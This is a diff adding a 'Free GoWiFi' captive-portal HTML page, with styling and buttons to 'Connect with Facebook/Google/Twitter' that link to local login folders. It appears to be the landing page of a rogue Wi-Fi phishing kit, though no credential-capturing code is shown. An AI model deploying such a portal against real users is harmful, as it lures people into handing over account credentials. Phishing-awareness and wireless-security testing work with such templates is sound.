@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+
+    <title>Free GoWiFi</title>
+
+    <meta charset='UTF-8'>
+    <meta http-equiv="cache-control" content="no-cache" />
+    <meta http-equiv="expires" content="0" />
+    <meta http-equiv="pragma" content="no-cache" />
+    <meta name="viewport" content="width=device-width,
+    initial-scale=0.75, maximum-scale=0.75, user-scalable=no">
+    <meta name="robots" content="noindex, nofollow"> 
+    <link rel="Shortcut Icon" type="image-x/icon" href="img/favicon.png">
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <script src="js/jquery-3.6.0.slim.min.js"></script> 
+    <script src="js/bootstrap.min.js"></script>
+    <style>
+        @font-face {
+            font-family: "Morandi W01";
+            src: url("523fcf4c309d4dfb7a3de19153e8686d.woff") format("woff");
+        }
+        body{
+            background-color: #5044cf;
+            background-image: url('img/bg-img-main.png');
+            background-position: bottom;
+            background-repeat: no-repeat;
+            background-size: 480px;
+            color: white;
+        }
+        .max-h {
+            min-height: 100vh;
+            display: flex;
+        }
+        .logo{
+            display: block;
+            max-width: 100%;
+            height: auto;
+            width: 55%;
+        }
+        .center {    
+            align-items: center;
+        }
+        h1{
+            font-family: "Morandi W01";
+        }
+        
+        .login-box {
+            padding: 20px;
+            max-width: 450px;
+            margin: 5vh auto;
+            text-align: center;
+            letter-spacing: 1px;
+            position: relative;
+        }
+        
+        .social-button {
+	        background-position: 25px 0px;
+            box-sizing: border-box;
+            color: rgb(255, 255, 255);
+            cursor: pointer;
+            display: inline-block;
+            height: 50px;
+	        line-height: 50px;
+            text-align: left;
+            text-decoration: none;
+            text-transform: uppercase;
+            vertical-align: middle;
+            width: 100%;
+	        border-radius: 3px;
+            margin: 10px auto;
+            outline: rgb(255, 255, 255) none 0px;
+            padding-left: 20%;
+            transition: all 0.2s cubic-bezier(0.72, 0.01, 0.56, 1) 0s;
+	        -webkit-transition: all .3s ease;
+            -moz-transition: all .3s ease;
+            -ms-transition: all .3s ease;
+            -o-transition: all .3s ease;
+            transition: all .3s ease;
+        }
+        
+        #facebook-connect {
+            background: rgb(255, 255, 255) url('img/facebook.svg') no-repeat scroll 5px 0px / 30px 50px padding-box border-box;
+            border: 1px solid rgb(60, 90, 154);
+        }
+
+        #facebook-connect:hover {
+	          border-color: rgb(60, 90, 154);
+	          background: rgb(60, 90, 154) url('img/facebook-white.svg') no-repeat scroll 5px 0px / 30px 50px padding-box border-box;
+	          -webkit-transition: all .8s ease-out;
+                -moz-transition: all .3s ease;
+            -ms-transition: all .3s ease;
+            -o-transition: all .3s ease;
+            transition: all .3s ease-out;
+        }
+
+        #facebook-connect span {
+	        box-sizing: border-box;
+            color: rgb(60, 90, 154);
+            cursor: pointer;
+            text-align: center;
+            text-transform: uppercase;
+            border: 0px none rgb(255, 255, 255);
+            outline: rgb(255, 255, 255) none 0px;
+	        -webkit-transition: all .3s ease;
+            -moz-transition: all .3s ease;
+            -ms-transition: all .3s ease;
+            -o-transition: all .3s ease;
+            transition: all .3s ease;
+        }
+
+        #facebook-connect:hover span {
+            text-decoration: none;
+	         color: #FFF;
+	        -webkit-transition: all .3s ease;
+            -moz-transition: all .3s ease;
+            -ms-transition: all .3s ease;
+            -o-transition: all .3s ease;
+            transition: all .3s ease;
+        }
+        
+        #twitter-connect {
+            background: rgb(255, 255, 255) url('img/twitter.png') no-repeat scroll 5px 1px / 45px 45px padding-box border-box;
+            border: 1px solid rgb(85, 172, 238);
+        }
+
+        #twitter-connect:hover {
+	          border-color: rgb(85, 172, 238);
+	          background: rgb(85, 172, 238) url('img/twitter-white.png') no-repeat scroll 5px 1px / 45px 45px padding-box border-box;
+	          -webkit-transition: all .8s ease-out;
+            -moz-transition: all .3s ease;
+            -ms-transition: all .3s ease;
+            -o-transition: all .3s ease;
+            transition: all .3s ease-out;
+        }
+
+        #twitter-connect span {
+	          box-sizing: border-box;
+            color: rgb(85, 172, 238);
+            cursor: pointer;
+            text-align: center;
+            text-transform: uppercase;
+            border: 0px none rgb(220, 74, 61);
+            outline: rgb(255, 255, 255) none 0px;
+	          -webkit-transition: all .3s ease;
+            -moz-transition: all .3s ease;
+            -ms-transition: all .3s ease;
+            -o-transition: all .3s ease;
+            transition: all .3s ease;
+        }
+
+        #twitter-connect:hover span {
+        text-decoration: none;
+	          color: #FFF;
+	          -webkit-transition: all .3s ease;
+            -moz-transition: all .3s ease;
+            -ms-transition: all .3s ease;
+            -o-transition: all .3s ease;
+            transition: all .3s ease;
+        }
+        
+        #google-connect {
+            background: rgb(255, 255, 255) url('img/google-plus.png') no-repeat scroll 5px 0px / 50px 50px padding-box border-box;
+            border: 1px solid rgb(220, 74, 61);
+        }
+
+        #google-connect:hover {
+	          border-color: rgb(220, 74, 61);
+	          background: rgb(220, 74, 61) url('img/google-plus-white.png') no-repeat scroll 5px 0px / 50px 50px padding-box border-box;
+	          -webkit-transition: all .8s ease-out;
+            -moz-transition: all .3s ease;
+            -ms-transition: all .3s ease;
+            -o-transition: all .3s ease;
+            transition: all .3s ease-out;
+        }
+
+        #google-connect span {
+	          box-sizing: border-box;
+            color: rgb(220, 74, 61);
+            cursor: pointer;
+            text-align: center;
+            text-transform: uppercase;
+            border: 0px none rgb(220, 74, 61);
+            outline: rgb(255, 255, 255) none 0px;
+	          -webkit-transition: all .3s ease;
+            -moz-transition: all .3s ease;
+            -ms-transition: all .3s ease;
+            -o-transition: all .3s ease;
+            transition: all .3s ease;
+        }
+
+        #google-connect:hover span {
+	          color: #FFF;
+	          -webkit-transition: all .3s ease;
+            -moz-transition: all .3s ease;
+            -ms-transition: all .3s ease;
+            -o-transition: all .3s ease;
+            transition: all .3s ease;
+        }
+        
+    </style>
+
+  </head>
+
+  <body class="max-h text-center center">
+    <div class="container d-flex h-100 p-3 mx-auto flex-column center">
+        <img class="img-fluid logo" src="img/gwf-logo.svg">
+           <h1 class="masthead-brand"><strong>Want FREE WiFi?</strong></h1>
+           <div class="container login-box">
+			<a href="facebook-login/" class="social-button" id="facebook-connect"> <span>Connect with Facebook</span></a>
+			<a href="google-login/" class="social-button" id="google-connect"> <span>Connect with Google</span></a>
+			<a href="twitter-login/" class="social-button" id="twitter-connect"> <span>Connect with Twitter</span></a>
+           </div>
+    </div>
+  </body>
+
+</html>
